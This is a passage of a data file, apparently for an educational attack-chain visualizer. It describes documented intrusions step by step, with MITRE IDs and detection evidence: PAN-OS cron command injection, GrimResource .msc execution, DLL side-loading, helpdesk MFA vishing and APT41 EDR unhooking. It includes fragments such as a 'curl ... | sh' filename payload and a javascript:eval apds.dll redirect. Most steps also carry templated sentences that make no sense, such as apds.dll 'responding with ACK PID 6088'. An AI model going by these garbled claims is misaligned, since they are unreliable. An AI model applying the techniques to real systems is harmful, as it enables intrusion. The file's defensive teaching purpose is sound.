          'Once every minute, the PAN-OS device telemetry cron job (dt_curl / sendTelemetry, a scheduled background script running with full uid=0(root) privileges) loops through every file in /opt/panlogs/tmp/device_telemetry/minute/ and pastes each filename directly into a shell command string without escaping special characters. When the Linux shell parses that command string, it sees the backticks (curl ... | sh, which in Bash/sh means "execute the command inside these backticks first and substitute its output"), immediately running the attacker’s payload as root.',
        howItWorksInPractice:
          'Because the attacker never needed to write data into the file, only control its filename via the Step 1 path traversal, even a 0-byte file in the minute/ telemetry folder triggers unauthenticated root Remote Code Execution the next time the cron job ticks. In the documented Auditd SYSCALL 59 exchange from DMZ Reverse Proxy & SPAN Tap to PAN-OS GlobalProtect Edge, PAN-OS GlobalProtect Edge responds with ACK UID 0 (root) (confirming that the CRON RCE (ROOT) request succeeded on PAN-OS GlobalProtect Edge and establishing the runtime state required for Step #3 UPSTYLE PYTHON .PTH PERSISTENCE & LOG C2).',
        diagramAlignment:
          'On the diagram, arrow #2→ shows Node ③ triggering Node ④ (dt_curl root cron job evaluating the backtick filename), and ⇠#2 spawns /bin/sh as uid=0(root) to fetch the stage-2 script.',
        detectionAndEvidence:
          'Documented by Unit 42 & Volexity: /var/log/pan/device_telemetry_send.log containing shell syntax fragments and unexpected outbound connections initiated by dt_curl.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1505.003',
        plainTitle: 'Deploying the "UPSTYLE" Python Webshell in system.pth and Stealing running-config.xml',
        storyAnalogy:
          'Now holding the building’s master key, the intruder copies the master blueprint (running-config.xml), slips an auto-start hook into Python’s startup list (system.pth), installs a hidden listener inside the hotel’s public stylesheet file (bootstrap.min.css), and sets a timer that wipes the security logs the moment a command finishes.',
        simpleExplanation:
          'Combining Volexity’s and Unit 42’s forensic findings: with root access on the firewall, the attacker steals /opt/pancfg/mgmt/saved-configs/running-config.xml (the master PAN-OS configuration file containing VPN pre-shared keys, administrator hashes, and internal network routes used by UTA0218 to pivot into internal Windows Domain Controllers via SMB/winexe) and injects the UPSTYLE Python backdoor into /usr/lib/python3.6/site-packages/system.pth (a Python path-configuration file that Python automatically executes every time any system script starts on the appliance). UPSTYLE monitors /var/log/pan/sslvpn_ngx_error.log for crafted HTTPS requests and writes command output into /var/appweb/sslvpndocs/global-protect/portal/css/bootstrap.min.css (the public CSS stylesheet of the VPN login page, letting the attacker read command results over port 443).',
        howItWorksInPractice:
          'When the attacker sends a specially formatted HTTPS request with a bogus URL that logs an error into sslvpn_ngx_error.log, the background UPSTYLE inotify daemon parses the embedded Base64 command, appends the output inside a CSS comment /*...*/ in bootstrap.min.css, and 15 seconds later restores the original CSS file and deletes the offending log line (erasing both the command and output traces).',
        diagramAlignment:
          'On the diagram, arrow #3→ implants UPSTYLE into Node ⑤ (PAN-OS system.pth, bootstrap.min.css & running-config.xml), while Node ⑥ (SIEM / Cortex XDR) flags the CSS modification timestamp and config exfiltration.',
        detectionAndEvidence:
          'Documented in Unit 42 & Volexity advisories: unauthorized entries in /usr/lib/python3.6/site-packages/system.pth, rogue Python processes running exec(base64.b64decode(...)), and unexpected mtime changes on bootstrap.min.css.',
      },
    ],
  },

  'elastic-grimresource-msc': {
    scenarioId: 'elastic-grimresource-msc',
    briefing: {
      headline: 'Scenario Briefing: GrimResource (CVE-2024-43572 / MMC Attack), Code Execution via Crafted .msc Files',
      storyAnalogy:
        'Imagine a company that banned employees from opening .exe packages, but still trusts official-looking "Settings Binder" files (.msc) opened by the built-in Windows Management Console (mmc.exe). The attacker hides a legacy 1990s self-running gadget (apds.dll XSS) inside a Settings Binder; when opened, mmc.exe automatically runs the hidden script inside its own trusted process.',
      plainSummary:
        'Synthesizing research from Elastic Security Labs (who discovered "GrimResource" in June 2024), MDSec (DotNetToJScript), and Microsoft MSRC (CVE-2024-43572), this technique achieves arbitrary code execution inside Windows Management Console (mmc.exe, the signed Microsoft binary used for Event Viewer and Device Manager) when a user opens a crafted Microsoft Saved Console (.msc) file. By abusing a cross-site scripting (XSS) flaw in the legacy Windows apds.dll library (res://apds.dll/redirect.html, which blindly executes javascript: URLs inside mmc.exe’s HTML view) together with DotNetToJScript (deserializing a .NET assembly directly in RAM via BinaryFormatter) and RwSection injection into dllhost.exe, the attacker runs Cobalt Strike inside a trusted system process.',
      diagramTopologySummary:
        'On the diagram: Start at Node ①/② (Phishing Delivery of invoice_audit.msc), follow user execution on Node ③ (Windows Workstation mmc.exe), trace the apds.dll DOM XSS and DotNetToJScript memory injection inside Node ④ (mmc.exe / dllhost.exe), and watch the final C2 connection to Node ⑤ detected by Node ⑥ (Elastic Defend / SIEM).',
      documentedAdvisory: 'Elastic Security Labs "GrimResource" Report · Microsoft MSRC CVE-2024-43572 · MDSec DotNetToJScript · MITRE T1218.014',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1218.014',
        plainTitle: 'Opening a Malicious .msc File Triggers the Legacy apds.dll Redirect Vulnerability (CVE-2024-43572)',
        storyAnalogy:
          'The employee double-clicks an administrative binder (invoice_audit.msc). Inside the binder’s cover page (StringTables), a hidden reference tells the Windows Management Console to open an ancient help-viewer page (res://apds.dll/redirect.html) that blindly executes whatever script is written in its target parameter.',
        simpleExplanation:
          'The victim double-clicks a weaponized console file (invoice_audit.msc, an XML-based Windows Management Console file used to bypass email and browser blocks on .exe and .lnk files), which Windows automatically opens using the trusted system binary C:\\Windows\\System32\\mmc.exe. Inside the .msc XML structure, the <StringTables> section points an embedded HTML panel to res://C:\\Windows\\System32\\apds.dll/redirect.html?target=javascript:eval(...) (abusing an ancient HTML page baked inside Microsoft’s own apds.dll library that blindly passes its "target=" parameter into a browser redirect, CVE-2024-43572, immediately executing the attacker’s VBScript/JavaScript inside mmc.exe).',
        howItWorksInPractice:
          'C:\\Windows\\System32\\apds.dll (the legacy Microsoft Help Center library shipped on every Windows installation) contains an embedded resource (redirect.html) that passes the target query parameter directly to document.location.replace() without sanitizing javascript: or vbscript: URI schemes, giving the .msc file full script execution inside mmc.exe’s privileged MSHTML Zone.',
        diagramAlignment:
          'On the diagram, follow arrow #1→ from Node ①/② into Node ③ (mmc.exe loading invoice_audit.msc and apds.dll), and return arrow ⇠#1 triggering JScript execution inside mmc.exe.',
        detectionAndEvidence:
          'Documented by Elastic Security Labs & MSRC CVE-2024-43572: Sysmon EventID 7 showing mmc.exe loading both apds.dll and jscript.dll / vbscript.dll while parsing a non-standard .msc file.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1059.007',
        plainTitle: 'Using DotNetToJScript to Reconstruct a .NET Loader Inside mmc.exe Memory',
        storyAnalogy:
          'Once the legacy script starts running inside mmc.exe, it acts like a 3D printer inside the building: it reads an encoded blueprint from the binder and materializes a full .NET loader (BinaryFormatter.Deserialize) directly in RAM.',
        simpleExplanation:
          'Plain JScript cannot call low-level Windows memory APIs directly, so the script inside mmc.exe uses the DotNetToJScript technique: it creates a .NET BinaryFormatter COM object via ActiveX (new ActiveXObject("System.Runtime.Serialization.Formatters.Binary.BinaryFormatter")) and deserializes a Base64-encoded .NET assembly ("GrimLoader") directly in RAM (allowing the attacker to bridge from limited JScript into a full .NET program with complete Win32 API access inside mmc.exe, without ever dropping a .dll or .exe file onto the hard drive).',
        howItWorksInPractice:
          'Deserializing a crafted gadget chain via BinaryFormatter loads the .NET Common Language Runtime (clr.dll / mscoree.dll) into mmc.exe and invokes Assembly.Load(byte[]) in memory (giving the attacker full P/Invoke access to kernel32.dll and ntdll.dll from inside a Microsoft-signed console process).',
        diagramAlignment:
          'On the diagram, arrow #2→ deserializes the .NET assembly inside Node ④ (mmc.exe CLR Runtime clr.dll / mscoree.dll), and return arrow ⇠#2 initializes the in-memory injector.',
        detectionAndEvidence:
          'Documented by Elastic Security Labs: mmc.exe loading jscript9.dll / jscript.dll followed immediately by .NET CLR (clr.dll) and amsi.dll in the same process.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1055',
        plainTitle: 'Spawning dllhost.exe & Injecting the Cobalt Strike Beacon via RwSection / DirtyVanity',
        storyAnalogy:
          'Finally, so the employee can close the Settings Binder without killing the malware, the in-memory loader spawns a quiet background helper (dllhost.exe) and hands the active C2 radio over to it.',
        simpleExplanation:
          'If the victim notices an empty console window and clicks "X" to close mmc.exe, any malware running inside mmc.exe would die immediately. To survive, the in-memory .NET loader spawns a hidden background C:\\Windows\\System32\\dllhost.exe process (COM Surrogate, a legitimate Windows background host that runs without a visible taskbar window), maps a shared Read-Write-Execute memory section via NtCreateSection / NtMapViewOfSection ("RwSection" technique documented by Elastic Security Labs, avoiding suspicious VirtualAllocEx calls), and injects the Cobalt Strike C2 beacon into dllhost.exe.',
        howItWorksInPractice:
          'Migrating execution from the interactive mmc.exe process into a headless dllhost.exe process via shared section mapping (RwSection) or Asynchronous Procedure Call (NtQueueApcThread) ensures the C2 beacon stays alive in the background long after the victim closes the .msc window. In the documented Sysmon EID 1 & 8 exchange from mmc.exe (Management Console) to apds.dll & DotNetToJScript, apds.dll & DotNetToJScript responds with ACK PID 6088 (confirming that the INJECT DLLHOST.EXE request succeeded on apds.dll & DotNetToJScript and completing the final execution objective of Elastic Security Labs, GrimResource: MMC & apds.dll XSS-to-RCE Execution).',
        diagramAlignment:
          'On the diagram, arrow #3→ injects from Node ④ (mmc.exe) into dllhost.exe and connects out to Node ⑤ (C2 Server), while Node ⑥ (Elastic Defend / SIEM) correlates the .msc → apds.dll → dllhost.exe chain.',
        detectionAndEvidence:
          'Documented in Elastic Detection Rule execution_via_mmc_apds_dll: mmc.exe loading apds.dll and spawning or injecting into dllhost.exe.',
      },
    ],
  },

  'elastic-lotus-blossom-chrysalis': {
    scenarioId: 'elastic-lotus-blossom-chrysalis',
    briefing: {
      headline: 'Scenario Briefing: Lotus Blossom APT, DLL Side-Loading (WinGUp / MsMpEng) & "Chrysalis / Sagerunex" Backdoor',
      storyAnalogy:
        'Imagine a celebrity who only travels with their trusted personal assistant (mpclient.dll / libcurl.dll). Windows has a habit of checking the hotel lobby (the current folder) for the assistant before checking the official headquarters (System32). The attacker places an imposter wearing a name tag that says mpclient.dll right in the lobby next to a genuine, digitally signed program (MsMpEng.exe or Notepad++ GUP.exe). When the genuine program starts up, it hires the imposter standing right next to it.',
      plainSummary:
        'Synthesizing independent reports from Elastic Security Labs (who dissected the Notepad++ WinGUp GUP.exe + libcurl.dll + CHRYSALIS chain) and Cisco Talos (who documented the MsMpEng.exe + mpclient.dll + Sagerunex lineage), the Lotus Blossom APT group (Billbug / Spring Dragon / G0030) relies on a 3-piece DLL Side-Loading triad (MITRE T1574.002). Instead of running an unsigned malware .exe that EDR agents would block, the attacker drops a genuine, digitally signed executable (GUP.exe or MsMpEng.exe, chosen because its valid digital signature passes application-allowlisting checks) alongside a maliciously crafted companion DLL (libcurl.dll or mpclient.dll, loaded automatically from the current directory) and an RC4/XOR-encrypted payload file (chrysalis.dat / conf.bin, keeping the real backdoor scrambled on disk).',
      diagramTopologySummary:
        'On the diagram: Start at Node ①/② (Initial Perimeter Compromise), trace the staging of the signed host binary and trojanized DLL on Node ③ (Enterprise Server), follow the DLL side-loading and RC4/XOR payload decryption inside Node ④ (Chrysalis In-Memory Backdoor), and observe the HTTPS C2 tunnel to Node ⑤ detected by Node ⑥ (SIEM / Elastic EDR).',
      documentedAdvisory: 'Elastic Security Labs CHRYSALIS Report · Cisco Talos Sagerunex Analysis · MITRE ATT&CK G0030 / T1574.002',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1574.002',
        plainTitle: 'Dropping a Legitimate Signed Binary (GUP.exe / MsMpEng.exe) Alongside a Trojanized Companion DLL',
        storyAnalogy:
          'The intruder drops a 3-piece kit into a quiet folder (C:\\ProgramData\\Comms\\): (1) a real, digitally signed executable, (2) a trojanized helper library with the exact name the executable looks for (mpclient.dll / libcurl.dll), and (3) a locked box of encrypted shellcode (chrysalis.dat).',
        simpleExplanation:
          'Across campaigns analyzed by Elastic Security Labs and Cisco Talos, the attacker stages a 3-file triad inside a writable folder like C:\\ProgramData\\Comms\\: (1) a genuine, digitally signed executable (such as Microsoft’s MsMpEng.exe or Notepad++ WinGUp GUP.exe, authentic signed binaries whose valid digital certificates prevent antivirus from blocking the .exe launch), (2) a malicious companion DLL named mpclient.dll or libcurl.dll placed in that exact same folder (exploiting Windows’ default DLL search order, which checks the application’s current directory before C:\\Windows\\System32), and (3) an encrypted data file named chrysalis.dat or conf.bin (containing the actual backdoor in scrambled form so static file scanners see only random bytes).',
        howItWorksInPractice:
          'When the signed host binary starts from C:\\ProgramData\\Comms\\, the Windows loader (ntdll!LdrLoadDll) resolves its Import Address Table (IAT), sees an import for mpclient.dll / libcurl.dll, finds the attacker’s unsigned DLL sitting in the local directory first, and maps it directly into the trusted process.',
        diagramAlignment:
          'On the diagram, follow arrow #1→ from Node ③ (Signed Host Binary) loading Node ④ (Malicious Side-Loaded DLL in C:\\ProgramData\\Comms\\), and return arrow ⇠#1 executing DllMain.',
        detectionAndEvidence:
          'Documented in Sysmon EventID 7 (ImageLoaded): a signed system/vendor executable (MsMpEng.exe or GUP.exe) running from a non-standard directory (C:\\ProgramData\\) and loading an unsigned DLL.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1140',
        plainTitle: 'API Hashing & Decrypting the "chrysalis.dat" Shellcode Blob Purely in RAM',
        storyAnalogy:
          'Once the imposter assistant (mpclient.dll / libcurl.dll) is invited inside the VIP suite, they quietly unlock the third file (chrysalis.dat) in memory, so no antivirus scanner looking at the hard drive ever sees the real weapon.',
        simpleExplanation:
          'Once the signed binary loads the trojanized DLL and calls its exported startup function (keeping the malicious DLL tiny and using custom 32-bit API hashing instead of plaintext function names like VirtualAlloc so static analysts see no suspicious imports), the DLL opens the companion file chrysalis.dat / conf.bin from disk, decrypts its bytes in RAM using a custom RC4/XOR key, and copies the unpacked Chrysalis / Sagerunex shellcode into an executable memory buffer (meaning the actual APT backdoor code only ever exists in volatile memory, never unencrypted on the hard drive).',
        howItWorksInPractice:
          'Splitting the infection chain across three files (a clean signed .exe, a minimal loader .dll using API hashing, and an encrypted .dat/.bin blob) defeats traditional signature scanners: the .exe is 100% legitimate, the .dll contains only a simple file-read and XOR/RC4 loop, and the .dat file has no PE header ("MZ") on disk.',
        diagramAlignment:
          'On the diagram, arrow #2→ inside Node ④ reads and decrypts chrysalis.dat into a VirtualAlloc buffer, and ⇠#2 transfers execution to the unpacked Chrysalis / Sagerunex implant.',
        detectionAndEvidence:
          'Documented by Elastic Security Labs & Cisco Talos: private executable memory allocation (VirtualAlloc RW → RX) inside a side-loaded process immediately after reading a local .dat / .bin file.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1071.001',
        plainTitle: 'Establishing Persistence & Beaconing Over HTTPS Using Corporate Proxy Credentials',
        storyAnalogy:
          'Wearing the trusted program’s badge, the decrypted backdoor reads the employee’s own internet proxy pass from Windows (WinInet) and blends its outbound HTTPS messages right into normal office web traffic.',
        simpleExplanation:
          'Running inside the trusted host binary, the decrypted Chrysalis/Sagerunex implant registers a persistent Windows service or Registry Run key (pointing to the legitimate signed .exe so startup monitors see a signed binary), and calls Windows WinInet APIs (InternetOpenW and HttpSendRequestW, chosen instead of raw sockets because WinInet automatically reads the logged-in employee’s corporate proxy settings and cached NTLM/Kerberos credentials, allowing the C2 beacon to pass right through strict enterprise web proxies).',
        howItWorksInPractice:
          'In many enterprise networks, direct outbound TCP/443 connections are blocked unless traffic authenticates through a corporate HTTP proxy. Using WinInet with INTERNET_OPEN_TYPE_PRECONFIG lets the malware piggyback on Windows’ built-in proxy configuration and user credentials automatically. In the documented Sysmon EID 3 exchange from GUP.exe (Signed WinGUp) to libcurl.dll & CHRYSALIS RAM, libcurl.dll & CHRYSALIS RAM responds with ACK TLS 1.2 (confirming that the HTTPS C2 BEACON request succeeded on libcurl.dll & CHRYSALIS RAM and completing the final execution objective of Elastic Security Labs, Lotus Blossom APT: WinGUp DLL Side-Loading & CHRYSALIS Backdoor).',
        diagramAlignment:
          'On the diagram, arrow #3→ connects Node ④ (Chrysalis Backdoor) out to Node ⑤ (Lotus Blossom HTTPS C2) while Node ⑥ (SIEM) correlates the side-loaded DLL with the outbound beacon.',
        detectionAndEvidence:
          'Documented in Elastic & Talos advisories: Sysmon EventID 3 outbound HTTPS connection from a binary executing out of C:\\ProgramData\\ with an unsigned side-loaded module.',
      },
    ],
  },

  'unit42-scattered-spider-cloud': {
    scenarioId: 'unit42-scattered-spider-cloud',
    briefing: {
      headline: 'Scenario Briefing: Scattered Spider (Muddled Libra / UNC3944), Helpdesk Social Engineering to Cloud & ESXi Takeover',
      storyAnalogy:
        'Instead of picking the reinforced digital lock on the front door, the intruder calls the building’s IT Helpdesk pretending to be an employee who just bought a new phone, convinces the clerk to register the intruder’s own smartphone as the employee’s MFA badge, walks right into the IT Lobby (SSO Dashboard), and plugs a private tunnel cable (ngrok / Tailscale) directly into the cloud and virtual server control room.',
      plainSummary:
        'Synthesizing joint reports from CISA/FBI Advisory AA23-320A, Palo Alto Networks Unit 42 ("Muddled Libra"), and Google Mandiant ("UNC3944"), this scenario shows how modern identity-focused attackers bypass perimeter firewalls altogether. Instead of exploiting a software bug, the attacker calls the company’s IT Helpdesk pretending to be a real employee (vishing), convinces the helpdesk agent to reset Multi-Factor Authentication (MFA) and enroll the attacker’s own phone (giving the attacker a clean, first-party MFA device on the victim’s account), logs into the corporate Single Sign-On (Okta / Entra ID) portal, searches internal SharePoint/Confluence wikis for admin runbooks, deploys a legitimate remote-access tool (AnyDesk / Tailscale, signed commercial RMM tools that do not trigger malware alerts) for persistence, and pivots into AWS/Azure cloud infrastructure and VMware ESXi hypervisors.',
      diagramTopologySummary:
        'On the diagram: Start at Node ① (Scattered Spider Operator), target Node ②/③ (IT Helpdesk & Corporate IdP / SSO Portal) to enroll a rogue MFA device, pivot into Node ④ (VDI / Intune Workstation & RMM Tunnel), and escalate privileges inside Node ⑤ (AWS / Azure Cloud & ESXi Control Plane), monitored by Node ⑥ (Cloud SIEM / Identity Logs).',
      documentedAdvisory: 'CISA Alert AA23-320A · Unit 42 Muddled Libra Profile · Mandiant UNC3944 Research · MITRE T1556 / T1078.004',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1556',
        plainTitle: 'Helpdesk Social Engineering ("Vishing") to Register a Rogue MFA Device',
        storyAnalogy:
          'Armed with the employee’s badge number and birthday, the caller rings the IT Helpdesk ("Hi, I got a new iPhone and lost my authenticator app") and persuades the helpdesk clerk to pair the caller’s own phone to the employee’s corporate account.',
        simpleExplanation:
          'Having gathered a target IT or DevOps engineer’s personal details (employee ID, date of birth, and manager name from LinkedIn or data brokers), the attacker calls the corporate IT Helpdesk impersonating that employee ("vishing", voice phishing) and claims they just got a new phone and lost their authenticator app. Persuaded by the caller, the helpdesk clerk triggers an administrative MFA reset (user.mfa.factor.activate, registering the attacker’s own smartphone or FIDO2 security key directly onto the employee’s Okta / Entra ID account so the attacker can approve their own MFA prompts at will).',
        howItWorksInPractice:
          'Unlike phishing attacks that try to steal a temporary session cookie, social-engineering the IT Helpdesk to enroll a new MFA factor on the Identity Provider (IdP) gives the attacker a permanent, legitimate MFA credential tied to their own device. In the documented Okta SystemLog exchange from Muddled Libra (UNC3944) to Core Identity & VLAN Switch, Core Identity & VLAN Switch responds with RESP Okta MFA (confirming that the MFA FACTOR ENROLL request succeeded on Core Identity & VLAN Switch and establishing the runtime state required for Step #2 AUTHORIZED RMM TOOL DEPLOYMENT (SCREENCONNECT / NGROK)).',
        diagramAlignment:
          'On the diagram, follow arrow #1→ from Node ① (Scattered Spider Operator) to Node ②/③ (IT Helpdesk & SSO Identity Provider), and return arrow ⇠#1 issuing the new MFA enrollment and SAML/OIDC session token.',
        detectionAndEvidence:
          'Documented in CISA AA23-320A & Okta System Log: user.mfa.factor.deactivate / user.mfa.factor.activate followed immediately by login (user.session.start) from a residential VPN/proxy ASN.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1219',
        plainTitle: 'Logging Into the SSO Dashboard, Harvesting Runbooks & Deploying Commercial RMM Tools',
        storyAnalogy:
          'Inside the employee’s virtual office, the intruder reads the IT team’s emergency instruction manuals (Confluence / SharePoint) and installs a genuine, IT-approved remote support tool (AnyDesk / Tailscale) so even if the front-door password is changed tomorrow, they still have a private side door straight into the machine.',
        simpleExplanation:
          'Using the newly hijacked Single Sign-On (SSO) account, the attacker logs into the company’s virtual desktop (Citrix / Azure VDI), searches internal IT documentation (Confluence / SharePoint, documented by Mandiant UNC3944 as the primary way the group locates VPN guides, CyberArk/PAM instructions, and VMware vCenter architecture diagrams), and installs commercial Remote Monitoring and Management (RMM) or mesh-VPN tools like AnyDesk, ScreenConnect, Tailscale, or ngrok (chosen because these tools are digitally signed by legitimate software vendors so antivirus does not block them, and they maintain an encrypted outbound tunnel that survives even if the victim’s SSO password and MFA are later reset).',
        howItWorksInPractice:
          'Commercial RMM agents establish persistent outbound TLS/WebSocket connections to the vendor’s relay cloud, giving the attacker full interactive desktop control without deploying any custom malware binary. In the documented Sysmon EID 1 exchange from Core Identity & VLAN Switch to Okta / Entra ID SSO Portal, Okta / Entra ID SSO Portal responds with ACK PID 7488 (confirming that the RMM SCREENCONNECT request succeeded on Okta / Entra ID SSO Portal and establishing the runtime state required for Step #3 SAML FEDERATION PIVOT TO AWS & VMWARE VCENTER).',
        diagramAlignment:
          'On the diagram, arrow #2→ authenticates from Node ③ (SSO Portal) into Node ④ (Corporate VDI / Endpoint) and establishes the RMM tunnel (⇠#2).',
        detectionAndEvidence:
          'Documented in CISA AA23-320A & Mandiant UNC3944: Sysmon EventID 1 / 22 showing installation of unauthorized RMM binaries (AnyDesk.exe, ScreenConnect, tailscaled) and DNS queries to *.ngrok.io or *.tailscale.com.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1078.004',
        plainTitle: 'Federation / Cloud Control-Plane Takeover (AssumeRole) & VMware ESX Admins Pivot',
        storyAnalogy:
          'From the IT dashboard, the intruder attaches a second "Ghost Identity Provider" to the company’s cloud account, allowing them to mint temporary cloud master keys (AssumeRole) on demand, take over VMware ESXi hypervisors, and export customer databases from S3.',
        simpleExplanation:
          'Combining Unit 42’s and Mandiant’s findings: pivoting through the SSO dashboard into the AWS / Azure cloud management console, the attacker invokes sts:AssumeRole (minting temporary high-privilege cloud credentials) and calls CreateSAMLProvider / UpdateAssumeRolePolicy (registering a second, attacker-controlled SAML Identity Provider inside the cloud tenant, acting as a "golden SAML" backdoor that lets the attacker mint Admin cloud sessions even after the corporate Okta/Entra tenant is locked down). Simultaneously, for on-premises infrastructure, they add their compromised account to the Active Directory ESX Admins group to take direct SSH control over VMware ESXi hypervisors and export production S3 buckets.',
        howItWorksInPractice:
          'By compromising the Single Sign-On and Active Directory identity layer that governs both cloud role federation and hypervisor authentication, the attacker moves straight from a phone call to the IT Helpdesk into full control of AWS/Azure and VMware ESXi without touching a single network firewall exploit. In the documented CloudTrail STS/IAM exchange from Okta / Entra ID SSO Portal to Admin Endpoint (RMM Persistence), Admin Endpoint (RMM Persistence) responds with RESP AKIA...Key (confirming that the ASSUMEROLE + KEY request succeeded on Admin Endpoint (RMM Persistence) and completing the final execution objective of Unit 42 & CISA, Scattered Spider (Muddled Libra): SSO MFA Fatigue, RMM & AWS/ESXi Pivot).',
        diagramAlignment:
          'On the diagram, arrow #3→ pivots from Node ④ into Node ⑤ (AWS / Azure Cloud Control Plane via sts:AssumeRole), while Node ⑥ (CloudTrail / SIEM) alerts on IAM federation changes.',
        detectionAndEvidence:
          'Documented in Unit 42 & AWS CloudTrail / Entra Audit Logs: CreateSAMLProvider, UpdateAssumeRolePolicy, anomalous AssumeRole calls, and AD group modifications to ESX Admins.',
      },
    ],
  },

  'elastic-apt41-dustpan-stealthvector': {
    scenarioId: 'elastic-apt41-dustpan-stealthvector',
    briefing: {
      headline: 'Scenario Briefing: APT41 (Earth Freybug), DUSTPAN Dropper & STEALTHVECTOR / DUSTTRAP Multi-Stage Chain',
      storyAnalogy:
        'Imagine a Russian nesting doll of disguises: first, a trusted Windows system utility (wermgr.exe) is woken up; inside it sits a hollow launcher (DUSTPAN), which unpacks an encrypted memory-only command center (STEALTHVECTOR), which in turn unlocks a modular toolkit (DUSTTRAP) that talks directly to the Windows kernel (ntdll.dll) so user-mode security cameras never see it.',
      plainSummary:
        'Synthesizing independent research from Google Mandiant (DUSTPAN & DUSTTRAP), Elastic Security Labs (DodgeBox & STEALTHVECTOR), and Trend Micro (Earth Freybug), this scenario examines the multi-stage memory-only loader chain used by APT41. Rather than putting their full backdoor in a single file that analysts could easily reverse-engineer, APT41 uses a chain of hollow loaders: a legitimate Windows process (wermgr.exe, Windows Error Reporting, documented by Trend Micro as chosen because it regularly makes outbound HTTPS connections) is spawned and injected with Mandiant’s DUSTPAN launcher, which decrypts Elastic’s STEALTHVECTOR orchestrator in memory (which overwrites ntdll.dll in RAM to wipe out user-mode EDR hooks and spoofs thread call stacks), which in turn loads the 16-plugin DUSTTRAP framework.',
      diagramTopologySummary:
        'On the diagram: Start at Node ①/② (Scheduled Task / Service Trigger), follow the hollowing of wermgr.exe on Node ③ (Enterprise Server), trace the in-memory decryption of DUSTPAN → STEALTHVECTOR → DUSTTRAP inside Node ④ (Multi-Stage Memory Pipeline), and follow the encrypted C2 channel to Node ⑤ monitored by Node ⑥ (SIEM / Elastic EDR).',
      documentedAdvisory: 'Mandiant DUSTPAN/DUSTTRAP · Elastic Security Labs DodgeBox/STEALTHVECTOR · Trend Micro Earth Freybug · MITRE T1620',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1055',
        plainTitle: 'DUSTPAN Launcher Injects Into Windows Error Reporting (wermgr.exe)',
        storyAnalogy:
          'The outer nesting doll opens: the dropper starts the official Windows Error Reporting manager (wermgr.exe) and slips the DUSTPAN stage-1 loader into its memory.',
        simpleExplanation:
          'The initial persistence trigger executes the DUSTPAN stage-1 loader (a lightweight launcher documented by Mandiant that contains zero C2 domains or post-exploitation tools of its own, so if an analyst captures the file on disk they learn nothing about the final implant). DUSTPAN immediately spawns C:\\Windows\\System32\\wermgr.exe (Windows Error Reporting Manager, documented by Trend Micro’s Earth Freybug research as chosen because wermgr.exe is a Microsoft-signed binary that legitimately connects to external HTTPS servers to upload crash reports, allowing C2 traffic to blend in) and injects its decryption stub into wermgr.exe’s memory.',
        howItWorksInPractice:
          'By immediately transferring execution into C:\\Windows\\System32\\wermgr.exe via remote memory allocation and APC/thread hijacking, all subsequent stages execute under the process identity and digital signature of a built-in Windows telemetry binary.',
        diagramAlignment:
          'On the diagram, follow arrow #1→ from Node ③ (DUSTPAN Dropper) injecting into Node ④ (wermgr.exe Process Memory), and return arrow ⇠#1 confirming the in-memory stub is active.',
        detectionAndEvidence:
          'Documented in Sysmon EventID 8 / 10 & Trend Micro Earth Freybug report: remote thread or APC injection targeting C:\\Windows\\System32\\wermgr.exe from a non-system parent process.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1140',
        plainTitle: 'STEALTHVECTOR Unhooking ntdll.dll, Call-Stack Spoofing & Decrypting DUSTTRAP',
        storyAnalogy:
          'Before opening the inner nesting doll (DUSTTRAP), the STEALTHVECTOR stage brings in a fresh, un-bugged copy of the Windows system phonebook (ntdll.dll) from disk, wiping out all the wiretaps that the endpoint’s EDR security agent had placed on the phone lines.',
        simpleExplanation:
          'Running inside wermgr.exe, the STEALTHVECTOR stage (analyzed by Elastic Security Labs) reads a clean copy of C:\\Windows\\System32\\ntdll.dll from disk and overwrites the .text code section of the already-loaded ntdll.dll in RAM (because user-mode EDR agents monitor a program by placing 5-byte JMP "wiretap" hooks at the start of system functions inside ntdll.dll in memory, so pasting the clean bytes from disk right over the hooked bytes erases all of the EDR’s user-mode wiretaps). Simultaneously, it constructs synthetic thread call-stack frames (RtlUserThreadStart → BaseThreadInitThunk, so EDR memory walkers see a normal Windows call stack instead of unbacked shellcode) and ChaCha20/AES-GCM-decrypts Mandiant’s DUSTTRAP backdoor directly in memory.',
        howItWorksInPractice:
          'To unhook ntdll.dll, STEALTHVECTOR calls VirtualProtect on the in-memory ntdll.dll .text section (temporarily changing it from Read-Execute 0x20 to Read-Write-Execute 0x40), copies the clean .text bytes from the on-disk ntdll.dll file, and restores 0x20 permissions, silencing user-mode API hooks before DUSTTRAP initializes.',
        diagramAlignment:
          'On the diagram, arrow #2→ inside Node ④ unhooks ntdll.dll and decrypts DUSTTRAP in RAM, and ⇠#2 initializes the 16-plugin dispatch table.',
        detectionAndEvidence:
          'Documented by Elastic Security Labs & Mandiant: VirtualProtect on ntdll.dll .text section (RX → RWX → RX) inside wermgr.exe followed by unbacked PE execution.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1071.001',
        plainTitle: 'Loading DUSTTRAP’s 16 Plugins in Memory & Beaconing Over Custom mTLS',
        storyAnalogy:
          'With the phone lines un-tapped, the innermost doll (DUSTTRAP) snaps modular tool attachments (keylogger, credential harvester, file manager) directly into RAM as the remote operator requests them.',
        simpleExplanation:
          'With ntdll.dll unhooked inside wermgr.exe, the DUSTTRAP core opens a mutual-TLS channel (requiring both client and server certificates so security researchers cannot probe the C2 server or replay traffic) to APT41’s command infrastructure, and loads 16 specialized in-memory plugins (file manager, shell executor, credential harvester, Active Directory recon, streamed into RAM only when needed so the full toolkit never sits on the victim’s hard drive).',
        howItWorksInPractice:
